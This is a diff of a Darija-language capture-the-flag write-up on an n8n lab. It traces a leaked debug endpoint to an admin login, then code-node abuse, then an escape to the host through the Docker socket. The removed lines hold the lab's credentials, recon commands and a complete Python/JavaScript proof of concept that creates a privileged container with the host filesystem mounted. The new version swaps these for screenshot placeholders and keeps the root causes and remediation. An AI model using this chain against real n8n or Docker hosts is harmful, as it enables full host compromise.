@@ -4,231 +4,152 @@ draft: true
 
 # بِسْمِ اللَّهِ الرَّحْمَنِ الرَّحِيمِ
 
-> Metadata ma zednahach 7it nta gulti ghadi tzidha mn ba3d.
+# AutoFlow / n8n Lab (Burp-First b Darija)
 
-# AutoFlow / n8n Lab — Writeup b Darija (Step by Step)
+> Metadata khllinaha lik tzidha nta mn ba3d.
 
-## L'objectif
-Nqraw l-flag dyal host b tariqa legal f CTF (proof flag).
+## Chkon had writeup m3ah
+- Li bgha CTF flow واضح w reproducible
+- Li kayfaddal screenshots dyal Burp 3la raw HTTP dumps
 
-Final flag:
-
-```text
-flag_04f08006_5c38_428c_b137_734c23b84a40
-```
+## Final Flag
+`flag_04f08006_5c38_428c_b137_734c23b84a40`
 
 ---
 
-## 0) 3lach had l-path?
-Target kan fih n8n m7all 3la network. n8n powerful بزاف: ila 7kamti f workflows, t9dar twssel l-internal resources.
-
-Plan:
-1. Nqelbo 3la leak bla auth
-2. Nd5lo b creds s7a7
-3. Nbdlo workflow logic
-4. Npivotiw mn container l-host
-5. Nqraw `/root/proof.txt`
+## Attack Chain b sra7a
+1. Recon kayban n8n m7loul f `:5678`
+2. Endpoint debug public kayleak creds
+3. Login admin kayn b had creds
+4. Workflow active kaytbdl (code node abuse)
+5. Docker socket mwjoud mn dak context
+6. Privileged helper container kayqra `/root/proof.txt`
 
 ---
 
-## 1) Recon
+## Step 1 — Recon
+### Ash ndir
+Nchof services mftou7in.
 
-### Command
-```bash
-nmap -sC -sV -Pn -p- 10.8.0.2
-```
+### 3lach mohim
+`5678` howa n8n surface direct.
 
-### Ash ban lina
-Ports m7lولين:
-- 22 (SSH)
-- 443 (nginx)
-- 5678 (n8n)
-
-3lach mohim:
-- 5678 howa l-surface dyal n8n direct.
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/recon-ports.png`
 
 ---
 
-## 2) Foothold — Leak mn webhook
+## Step 2 — Burp: Credential Leak
+### Ash ndir (Burp)
+- Sift `GET /webhook/health` f Repeater
+- Qra response JSON
 
-### Command
-```bash
-curl -s http://10.8.0.2:5678/webhook/health
-```
+### Ash khas yban
+Admin bootstrap creds (email/password)
 
-### Result
-Kharaj lina debug info fih creds:
-- `admin@cyberlab.local`
-- `CyberL4b_N8N_2026!`
+### 3lach hadchi khatir
+Debug data sensitive mabghach tkoun public.
 
-3lach hadchi critical:
-- Had endpoint khasso maybanch public.
-- 3tana direct admin credentials.
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/burp-webhook-health-leak.png`
 
 ---
 
-## 3) Login l n8n API
+## Step 3 — Burp: Login Admin
+### Ash ndir
+- Replay dyal login b leaked creds
+- Verify session successful
 
-### Command
-```bash
-curl -s -X POST http://10.8.0.2:5678/rest/login \
-  -H "Content-Type: application/json" \
-  --data '{"emailOrLdapLoginId":"admin@cyberlab.local","password":"CyberL4b_N8N_2026!"}'
-```
+### 3lach mohim
+Admin access = workflow control.
 
-3lach mohim:
-- Wlina owner f n8n.
-- Owner y9dar ybdl workflows => impact كبير.
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/burp-login-success.png`
 
 ---
 
-## 4) Abuse dyal workflow/code node
+## Step 4 — Ikhtar Workflow Active
+### Target li tkhddemna bih
+`[AI Ops] Platform Health Check` (`F0FNURY2irgjJcbp`)
 
-Khddamna 3la workflow kayn deja (`[AI Ops] Platform Health Check`, id `F0FNURY2irgjJcbp`), bdlna code node, w 7ettina response mode يرجع result مباشر.
+### 3lach had target
+Workflow active, noise qlil, exploit sr3.
 
-3lach hadchi mzyan:
-- Ma kaynch noise بزاف (makhliqnach setup jdida بزاف).
-- Katst3ml behavior normal dyal n8n bash tdir attacker logic.
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/workflow-list-target.png`
 
 ---
 
-## 5) Pivot container -> host b Docker socket
+## Step 5 — Code Node Abuse
+### Ash ndir
+- Bddl code node logic
+- Khlli response mode yrejja3 output direct
 
-Lqina `/run/docker.sock` mounted f context dyal code execution.
+### Evidence
+- file read mn container
+- `/run/docker.sock` kayn
 
-3lach hadchi خطير:
-- Docker socket = control 3la Docker API.
-- غالبا katqdr twssel l-host ila createيتي privileged container.
+### 3lach mohim
+Docker socket exposure = boundary break kbira.
 
-Drna helper container:
+### Screenshot placeholders
+- `/mdx_images/2026/03/n8n/code-node-modified.png`
+- `/mdx_images/2026/03/n8n/docker-socket-evidence.png`
+
+---
+
+## Step 6 — Pivot l Host
+### Ash ndir
+Create helper container:
 - `Privileged: true`
-- bind mount `/:/host`
-- user root
+- `/:/host`
+- root user
 
-w qrina:
-- `/host/root/proof.txt`
+w qra `/host/root/proof.txt`.
 
----
-
-## 6) PoC كامل (exact)
-
-```bash
-python3 - <<'PY'
-import requests
-
-base='http://10.8.0.2:5678'
-email='admin@cyberlab.local'
-password='CyberL4b_N8N_2026!'
-wid='F0FNURY2irgjJcbp'  # [AI Ops] Platform Health Check
-
-js = r"""const http=require('http');
-function req(method,path,body=null,raw=false){
-  return new Promise((res,rej)=>{
-    const r=http.request(
-      {socketPath:'/run/docker.sock',path,method,headers:{'Content-Type':'application/json'}},
-      (rp)=>{
-        const c=[]; rp.on('data',d=>c.push(d));
-        rp.on('end',()=>{const b=Buffer.concat(c); res({status:rp.statusCode,body:raw?b:b.toString('utf8')});});
-      }
-    );
-    r.on('error',rej); if(body) r.write(JSON.stringify(body)); r.end();
-  });
-}
-function demux(buf){
-  let o=''; let i=0;
-  while(i+8<=buf.length){ const l=buf.readUInt32BE(i+4); o+=buf.slice(i+8,i+8+l).toString('utf8'); i+=8+l; }
-  return o||buf.toString('utf8');
-}
-async function main(){
-  const cmd="id; whoami; echo HOST=$(cat /host/etc/hostname 2>/dev/null); " +
-    "echo '--- root dir'; ls -la /host/root 2>&1; " +
-    "echo '--- read proof'; cat /host/root/proof.txt 2>&1;";
-
-  const create={
-    Image:'postgres:16-alpine',
-    User:'0:0',
-    Entrypoint:['/bin/sh','-c'],
-    Cmd:cmd,
-    HostConfig:{
-      Binds:['/:/host:rw'],
-      Privileged:true,
-      PidMode:'host',
-      NetworkMode:'host',
-      UsernsMode:'host'
-    }
-  };
-
-  const c=await req('POST','/containers/create',create);
-  let cid=null; try{cid=JSON.parse(c.body).Id}catch(e){}
-  if(!cid) return [{json:{create_status:c.status,create_body:c.body}}];
-
-  const st=await req('POST',`/containers/${cid}/start`);
-  const wt=await req('POST',`/containers/${cid}/wait`);
-  const lg=await req('GET',`/containers/${cid}/logs?stdout=1&stderr=1`,null,true);
-  await req('DELETE',`/containers/${cid}?force=1`);
-
-  return [{json:{create_status:c.status,start_status:st.status,wait:wt.body,logs:demux(lg.body)}}];
-}
-return await main();"""
-
-s=requests.Session()
-
-r=s.post(base+'/rest/login',json={'emailOrLdapLoginId':email,'password':password},timeout=15)
-print('[login]', r.status_code)
-
-wf=s.get(base+f'/rest/workflows/{wid}',timeout=20).json()['data']
-
-for n in wf['nodes']:
-    if n.get('name')=='Health Check Endpoint':
-        p=n.get('parameters',{})
-        p['responseMode']='lastNode'
-        p['responseData']='firstEntryJson'
-        n['parameters']=p
-    if n.get('name')=='Check Services':
-        n['type']='n8n-nodes-base.code'
-        n['typeVersion']=2
-        n['parameters']={'mode':'runOnceForAllItems','jsCode':js}
-
-wf['connections']['Check Services']={'main':[[]]}
-
-payload={k:wf.get(k) for k in ['name','nodes','connections','settings','staticData','pinData']}
-u=s.patch(base+f'/rest/workflows/{wid}',json=payload,timeout=30)
-print('[patch]', u.status_code)
-
-vid=u.json()['data']['versionId']
-a=s.post(base+f'/rest/workflows/{wid}/activate',json={'versionId':vid},timeout=30)
-print('[activate]', a.status_code)
-
-t=s.get(base+'/webhook/health',timeout=180)
-print('[trigger]', t.status_code)
-print(t.text)
-PY
-```
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/helper-container-pivot.png`
 
 ---
 
-## 7) 3lach exploit khdem?
-Root cause:
-1. Debug endpoint public kayleak creds
-2. Owner account y9dar ybdel workflows
-3. Docker socket m7ett f app context
-4. Privileged container creation mmsdoudch
+## Step 7 — Flag
+### Evidence
+`/root/proof.txt` kayban f output.
 
-Chain kamla:
-**info leak -> account takeover -> workflow abuse -> host compromise**
+### Screenshot placeholder
+`/mdx_images/2026/03/n8n/proof-flag-output.png`
 
----
-
-## 8) Remediation (khtissar)
-1. Sedd debug endpoints public
-2. 7mi n8n API b ACL + auth قوي
-3. Mamamnouch Docker socket l-app containers
-4. Mamnou3 privileged container creation
-5. Least privilege b strict separation bin app w host controls
+### Flag
+`flag_04f08006_5c38_428c_b137_734c23b84a40`
 
 ---
 
-## 9) Flag
-```text
-flag_04f08006_5c38_428c_b137_734c23b84a40
-```
+## Root Cause b khtissar
+- Debug endpoint public kayleak creds
+- Workflow modifications b privilege عالي
+- Docker socket exposed
+- Privileged container creation not blocked
+
+Chain:
+**info leak -> account compromise -> workflow abuse -> host compromise**
+
+---
+
+## Remediation
+1. Sedd/protect debug endpoints
+2. Restrict n8n admin/API exposure
+3. Matmountich Docker socket m3a app
+4. Block privileged containers
+5. Least privilege + isolation
+
+---
+
+## Publish Checklist
+- [ ] Bddl placeholders b screenshots dyalk
+- [ ] Zid metadata (title/date/tags/cover)
+- [ ] Redact secrets/creds f public version
+
+---
+
+## PoC Reference
+`/home/pi/.openclaw/workspace/CTFDGSSI/N8N_Host_Escape_POC.md`
